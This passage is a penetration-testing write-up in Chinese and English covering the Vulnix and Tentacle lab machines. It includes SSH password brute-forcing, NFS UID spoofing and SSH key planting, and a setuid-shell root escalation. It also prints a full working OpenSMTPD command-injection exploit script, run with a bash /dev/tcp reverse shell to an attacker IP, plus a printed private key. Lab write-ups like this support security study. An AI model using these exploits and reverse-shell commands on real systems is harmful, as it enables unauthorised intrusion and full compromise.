Export list for 192.168.66.18:
/home/vulnix *
```

这意味着可以从任何主机访问共享。因此将该共享的位置安装在本地计算机上：

``` bash
root@kali:~/vulnhub/vulnix# mount 192.168.66.18:/home/vulnix /root/vulnhub/vulnix
root@kali:~/vulnhub# cd vulnix
bash: cd: vulnix: 权限不够
```

但是当尝试访问该文件夹时，检索到拒绝访问。尝试更改访问权限，但检索到相同的错误。认为root squashing已启用，因为去过由该VM的创建者开办的培训课程，经常提到要使其保持启用状态。

#### getshell

至此，决定暴力破解已检索用户的密码。创建一个文件，收集所有用户（没有用户dovenull，没有登录访问权限）：

``` bash
root@kali:~/vulnhub/vulnix# cat user.txt 
root
user
vulnix
```

然后使用字典列表rockyou.txt破解密码：

``` bash
root@kali:~/vulnhub/vulnix# medusa -h 192.168.66.18 -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64
```

终于破解了用户user的密码，即letmein。

``` bash
root@kali:~# ssh user@192.168.66.18
The authenticity of host '192.168.66.18 (192.168.66.18)' can't be established.
ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.66.18' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
user@192.168.66.18's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Apr 16 03:53:37 BST 2020

  System load:  0.0              Processes:           89
  Usage of /:   90.2% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.66.18
  Swap usage:   0%

  => / is using 90.2% of 773MB                                                                                                        
                                                                                                                                      
  Graph this data and manage this system at https://landscape.canonical.com/

user@vulnix:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),100(users)
user@vulnix:~$ whoami
user
user@vulnix:~$ pwd
/home/user
user@vulnix:~$ uname -a
Linux vulnix 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
```

当然，该用户不是sudoer。

#### ssh key毒化以getshell

不得已时尝试以vulnix用户身份登录。

检查受害服务器上的/etc/passwd文件，发现用户vulnix具有UID 2008，因此在本地计算机上创建了一个名为vulnix的用户，UID为2008，然后尝试再次访问该分区：

``` bash
user@vulnix:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
postfix:x:104:110::/var/spool/postfix:/bin/false
dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:107:113::/var/lib/landscape:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
statd:x:109:65534::/var/lib/nfs:/bin/false
```

使用新创建的vulnix用户（具有UID 2008权限）成功进入已经挂载的/mnt/vulnix文件夹

``` bash
root@kali:~# useradd vulnix
root@kali:~# passwd vulnix
新的 密码：
重新输入新的 密码：
passwd：已成功更新密码
root@kali:~# leafpad /etc/passwd
root@kali:~# su vulnix
$ ls
android-backup-recover.jar  ctf               go                  Linux_Exploit_Suggester.pl  proxychains-ng  TheFatRat
ant                         Desktop           gobackdoor          linuxprivchecker.py         pwndbg          translatefiles
antshells                   dirmap            gobackdoor.go       linux-sendpage3             pycdc           trojan
antsword                    dirsearch         HiddenEye           location                    safedog2.py     uncompyle2
BlindWaterMark              Downloads         historyvulnhub      Lucifer113.ovpn             safedog.py      vulnhub
burpextend                  dvcs-ripper       hsdecomp            lxd-alpine-builder          shells          WAFNinja
cansina                     Fatrat_Generated  knock-knock-master  picture                     SocialFish
checkifbase64.py            GitHack           LinEnum.sh          pkcrack                     struts-pwn
$ id
uid=2008(vulnix) gid=2008 组=2008
$ pwd
/root
$ cd /mnt/vulnix
$ ls
$ pwd
/mnt/vulnix
$ whoami
vulnix
$ id
uid=2008(vulnix) gid=2008 组=2008
$ ls -la
总用量 20
drwxr-x--- 2 nobody 4294967294 4096 9月   2  2012 .
drwxr-xr-x 3 root   root       4096 4月  15 23:00 ..
-rw-r--r-- 1 nobody 4294967294  220 4月   3  2012 .bash_logout
-rw-r--r-- 1 nobody 4294967294 3486 4月   3  2012 .bashrc
-rw-r--r-- 1 nobody 4294967294  675 4月   3  2012 .profile
```

已经进入，生成一个SSH密钥，以vulnix用户身份登录而不需要密码：

``` bash
root@kali:~/vulnhub/vulnix# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/vulnhub/vulnix/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/vulnhub/vulnix/id_rsa
Your public key has been saved in /root/vulnhub/vulnix/id_rsa.pub
The key fingerprint is:
SHA256:spDzqP71ppmCK9Ls2eSA+m1TFlI8Rs5xptB4isWBn7M root@kali
The key's randomart image is:
+---[RSA 3072]----+
|   oo*o o        |
|  . ++B=         |
|   + *+.         |
|  . *..          |
|    ++..S        |
| .  E=oo         |
|.o..oo+          |
|+ +O+. +.        |
|o=B+=o+o.        |
+----[SHA256]-----+
root@kali:~/vulnhub/vulnix# ls
id_rsa  id_rsa.pub  user.txt
root@kali:~/vulnhub/vulnix# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
vU05iNf3ixaredAAAACXJvb3RAa2FsaQE=
-----END OPENSSH PRIVATE KEY-----
root@kali:~/vulnhub/vulnix# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali
```

然后在终端上以'vulnix'用户身份将生成的ssh-key复制到'/home/vulnix/.ssh/authorized_keys'文件中：

``` bash
$ mkdir .ssh
$ cd .ssh
$ pwd
/mnt/vulnix/.ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDetmdQqLfvlrWOcE1pjVqlFGyWzJ/5gbyYysYpycTAMYRdwpp7KdrN1ewEM9//RXaRAD1dg8Eb5D+mlzqGXgGmYOL5JsQMfkpJfZI/I43Wp5gAC72R/BLHwc7FZI9Rh488I6e6rFwEDaIghKyZKrXRBHuYxKIAOqkYWMzQL/bY2Ett0RfhZKwk9s4lWEkUuf1UK1UaksL+DcK7cJgnkS24B+8BhzC+CMmNbRFvsS6/uewFpNV9wVaQJ8/MWBcbN2Gcs5Es8iDb2XQ2seTFNuHRx82lxStJE7zFJRQXwAIzE5tu5VyPNuldfyutNrF6YTz28VUbrMtHERfQWTbUQdz8Ix9iPtGsdhR6Trz0poooZ9L9fl01AjAnSR9H/OTPkvVauR6asz7Ak9qbF5yQsMQZVN2DUeYg7BWwWkpX9CIBCKM+cJB9rV/Zu5DE45KVrasPzRsZgg+Unb9l1hH8aLMz7pASv5dwJPNZgOwpPY1g75lUJE6DFNHYLIu5jgdv4zs= root@kali" > authorized_keys
$ ls
authorized_keys
```

然后使用ssh私匙登录

``` bash
root@kali:~/vulnhub/vulnix# ssh vulnix@192.168.66.18 -i id_rsa
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Thu Apr 16 04:23:19 BST 2020

  System load:  0.0              Processes:           92
  Usage of /:   90.2% of 773MB   Users logged in:     1
  Memory usage: 9%               IP address for eth0: 192.168.66.18
  Swap usage:   0%

  => / is using 90.2% of 773MB

  Graph this data and manage this system at https://landscape.canonical.com/

New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

vulnix@vulnix:~$ id
uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
vulnix@vulnix:~$ whoami
vulnix
vulnix@vulnix:~$ pwd
/home/vulnix
```

#### 提权

``` bash
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```

很好,vulnix可以运行命令来打开/etc/exports，不用输入密码。这是发现的：

``` bash
vulnix@vulnix:~$ sudoedit /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home/vulnix    *(rw,root_squash)
```

还记得之前说过的有关Root squashing的内容吗？（感谢课程，Owen xD）

用no_root_squash替换了root_squash flag。需要作弊，因为没有vulnix的密码，而且没有sudo用户执行命令/usr/sbin/exportfs -a或计算机重新引导，就无法再次导出NFS分区，所以手动重新引导（Boooooo，真是个n0o0o0o0ob !!）

 - root_squash： 客户端的root用户映射到任何人：客户端无法使用setuid位将恶意软件留给他人执行。
 - no_root_squash：通过此选项，停用了此安全功能，从而允许客户端的root权限操作最终以root身份出现在导出的文件系统中（因此，在其余客户端中）。

机器重新启动后，再次安装该分区并以本地root用户身份访问。

检查机器是否再次启动（再次抱歉！）：

``` bash
root@kali:~# ping -c 4 192.168.66.18
PING 192.168.66.18 (192.168.66.18) 56(84) bytes of data.
64 bytes from 192.168.66.18: icmp_seq=1 ttl=64 time=1.04 ms
64 bytes from 192.168.66.18: icmp_seq=2 ttl=64 time=0.279 ms
64 bytes from 192.168.66.18: icmp_seq=3 ttl=64 time=0.482 ms
64 bytes from 192.168.66.18: icmp_seq=4 ttl=64 time=0.492 ms

--- 192.168.66.18 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3033ms
rtt min/avg/max/mdev = 0.279/0.572/1.037/0.281 ms
```

然后再次挂载分区：

``` bash
root@kali:~# mount 192.168.66.18:/home/vulnix /mnt/vulnix
root@kali:~# cd /mnt/vulnix
root@kali:/mnt/vulnix# ls
local_shell
```

挂载后，获得了受害者计算机本地shell的副本，并将所有权和SID更改为root：

在受害者的机器上，如“vulnix”：

``` bash
vulnix@vulnix:~$ cp /bin/bash local_shell
vulnix@vulnix:~$ ls
local_shell
```

在本地计算机上，以`root`身份：

``` bash
root@kali:/mnt/vulnix# cat local_shell > spawn_root_shell
root@kali:/mnt/vulnix# ls
local_shell  spawn_root_shell
root@kali:/mnt/vulnix# chmod 4777 *
root@kali:/mnt/vulnix# ls -la
总用量 1828
drwxr-x--- 4 vulnix vulnix   4096 4月  16 02:33 .
drwxr-xr-x 3 root   root     4096 4月  15 23:00 ..
-rw------- 1 vulnix vulnix      0 4月  16 02:27 .bash_history
-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc
drwx------ 2 vulnix vulnix   4096 4月  15 23:23 .cache
-rwsrwxrwx 1 vulnix vulnix 920788 4月  16 02:24 local_shell
-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile
-rwsrwxrwx 1 root   root   920788 4月  16 02:33 spawn_root_shell
drwxr-xr-x 2 vulnix vulnix   4096 4月  15 23:21 .ssh
```

然后在受害人的机器上执行shell，并保留带有flag -p的原始文件的权限：

``` bash
vulnix@vulnix:~$ ls -la
total 1828
drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .
drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..
-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history
-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache
-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell
-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell
drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh
vulnix@vulnix:~$ ./spawn_root_shell -p
spawn_root_shell-4.2# id
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
spawn_root_shell-4.2# whoami
root
spawn_root_shell-4.2# cd /root
spawn_root_shell-4.2# ls
trophy.txt
spawn_root_shell-4.2# cat trophy.txt
cc614640424f5bd60ce5d5264899c3be
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub257.jpg)

#### 知识点总结

 - 通过telnet连接收集用户名敏感信息
 - finger查看用户登录信息
 - 使用rpcinfo进行RPC枚举
 - 使用showmount进行NFS枚举
 - hydra爆破ssh密码
 - ssh key毒化攻击getshell
 - 特定linux UID权限用户登录挂载的NFS分区
 - 使用ssh私匙登录ssh
 - 用no_root_squash替换root_squash以停用安全功能，从而允许客户端的root权限操作最终使文件以root身份出现在导出的文件系统中（在其余客户端中）
 - 客户端本地以root身份运行cat命令拷贝shell文件，并chmod 4777赋予权限，最后执行shell文件加上-p参数提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end HackLAB-Vulnix -->

</details>

<a id="case-tentacle"></a>

## 代理、OpenSMTPD 与 keytab

DNS 与 Squid 影响内网服务访问，OpenSMTPD 连接初始账户。后半段保留 cron、Kerberos 和 keytab 的身份关系。

<p class="kb-provenance">来源 tentacle · 原记录 2021-01-31 · 31 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-tentacle">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start tentacle -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	23 Jan 2021
IP:	10.10.10.224

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb171.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.224
PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-01-31 01:37:21Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8
```

there’s a http server running on port 3128 let’s go there also nmap gave us a host: REALCORP.HTB

Got a username and a subdomain 😀 note these little hints, will be help us later 🙂 

``` bash
j.nakazawa@realcorp.htb
srv01.realcorp.htb (squid/4.11)
```

Also got hash while running GetNPUsers.py but that seems uncrackable, here I stucked for more hours and finally found the way that was fuzzing the other dommains

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# dnsenum --threads 64 --dnsserver 10.10.10.224 --file /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt realcorp.htb 
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
proxy.realcorp.htb.                      259200   IN    CNAME    ns.realcorp.htb.                                                                  
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
wpad.realcorp.htb.                       259200   IN    A        10.197.243.31
ns.realcorp.htb.                         259200   IN    A        10.197.243.77
```

So many domains and Ips 😦 But that can’t be easily accessible we need to use proxychains to enum it 🙂

update proxychains to avoid small errors 🙂

``` bash
apt-get install proxychains4
```

and need to add that proxy in our conf file. Edit /etc/proxychains.conf file

Here using dynamic chain you can also use strict chain 🙂

``` bash
http  10.10.10.224 3128
http  127.0.0.1 3128
http  10.197.243.77 3128
```

Add these things to the bottom of that conf file, then start enum

let’s nmap again 🙂 scan that .31 ip wpad.realcorp.htb

``` bash
proxychains -f /etc/proxychains.conf nmap -sT -Pn -v 10.197.243.31
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
464/tcp  open  kpasswd5
749/tcp  open  kerberos-adm
3128/tcp open  squid-http
```

sorted the nmap result coz it’s too long 😀

there’s a server running on port 80 let’s see that 😀 and remember need to use proxychains to view that page so

``` bash
proxychains -f /etc/proxychains.conf firefox wpad.realcorp.htb
```

add that to /etc/hosts file => “10.197.243.31 wpad.realcorp.htb”

got forbidden there 😦 but go to /wpad.dat able to download a file 🙂

Download and view that

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# proxychains -f /etc/proxychains.conf wget http://wpad.realcorp.htb/wpad.dat
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
--2021-01-30 21:21:33--  http://wpad.realcorp.htb/wpad.dat
正在解析主机 wpad.realcorp.htb (wpad.realcorp.htb)... 10.197.243.31
正在连接 wpad.realcorp.htb (wpad.realcorp.htb)|10.197.243.31|:80... [proxychains] Dynamic chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:80  ...  OK
已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：342 [application/octet-stream]
正在保存至: “wpad.dat”

wpad.dat                             100%[=====================================================================>]     342  --.-KB/s  用时 0s      

2021-01-30 21:21:37 (41.1 MB/s) - 已保存 “wpad.dat” [342/342])

┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# ls
wpad.dat
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# cat wpad.dat 
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}
```

look another IP 😦 let’s scan that there’s 10.197.243.0 but we already done that so let’s try that second IP

scanned that whole IP range and I found the IP 10.241.251.113 and there is smtp port opened 🙂

``` bash
proxychains -f /etc/proxychains.conf nmap -sT -sV -Pn 10.241.251.113
....
Nmap scan report for 10.241.251.113
Host is up (1.1s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
Service Info: Host: smtp.realcorp.htb
....
```

fine there’s OpenSMTPD running let’s search some exploits for this on internet 🙂

``` bash
google OpenSMTPD exploit
```

Sounds good 🙂 let’s try that (tried many exploits in python, perl and one in metasploit)

But looks like need to modify our exploit to pop a shell, so I edited a exploit that I found from [Remote code execution in OpenSMTPD](https://blog.firosolutions.com/exploits/opensmtpd-remote-vulnerability/)

simply modified that exploit to get shell 🙂 here is it

 - getshell.py

``` bash
import socket, time
import sys
if len(sys.argv) < 4:
    print("usage: script.py <host> <port> <command>")
    exit()
HOST = sys.argv[1]
PORT = int(sys.argv[2])
rev_shell_cmd = sys.argv[3]
payload = b"""\r\n

#0\r\n
#1\r\n
#2\r\n
#3\r\n
#4\r\n
#5\r\n
#6\r\n
#7\r\n
#8\r\n
#9\r\n
#a\r\n
#b\r\n 
#c\r\n
#d\r\n
""" + rev_shell_cmd.encode() + b"""
.
"""
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
        s = socket.socket(af, socktype, proto)
    except OSError as msg:
        s = None
        continue
    try:
        s.connect(sa)
    except OSError as msg:
        s.close()
        s = None
        continue
    break
if s is None:
    print('could not open socket')
    sys.exit(1)
with s:
    data = s.recv(1024)
    print('Received', repr(data))
    time.sleep(1)
    print('SENDING HELO')
    s.send(b"helo test.com\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")
    time.sleep(1)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"RCPT TO:<j.nakazawa@realcorp.htb>\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"DATA\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(payload)
    data = s.recv(1024)
    print('RECIEVED', repr(data))
    s.send(b"QUIT\r\n")
    data = s.recv(1024)
    print('RECIEVED', repr(data))
print("Exploited Check you netcat :D")
s.close()
```

start a netcat listener and run that above script like this

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# proxychains -f /etc/proxychains.conf python3 getshell.py 10.241.251.113 25 'bash -c "exec bash -i &> /dev/tcp/10.10.14.25/3334 <&1"'
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Dynamic chain  ...  10.10.10.224:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
Received b'220 smtp.realcorp.htb ESMTP OpenSMTPD\r\n'
SENDING HELO
RECIEVED b'250 smtp.realcorp.htb Hello test.com [10.241.251.1], pleased to meet you\r\n'
RECIEVED b'250 2.0.0 Ok\r\n'
RECIEVED b'250 2.1.5 Destination address valid: Recipient ok\r\n'
RECIEVED b'354 Enter mail, end with "." on a line by itself\r\n'
RECIEVED b'250 2.0.0 f1c85e8f Message accepted for delivery\r\n'
RECIEVED b'221 2.0.0 Bye\r\n'
Exploited Check you netcat :D
```

and got a shelll

``` bash
┌──(root💀kali)-[~]
└─# nc -lvp 3334                                                                                                                                   
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::3334
Ncat: Listening on 0.0.0.0:3334
Ncat: Connection from 10.10.10.224.
Ncat: Connection from 10.10.10.224:52864.
bash: cannot set terminal process group (12): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@smtp:~# whoami
whoami
root
```

Cool we got shell as root user of smtp

#### PRIVESC TO USER

try to search for creds

``` bash
root@smtp:/home/j.nakazawa# cat .msmtprc
cat .msmtprc
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
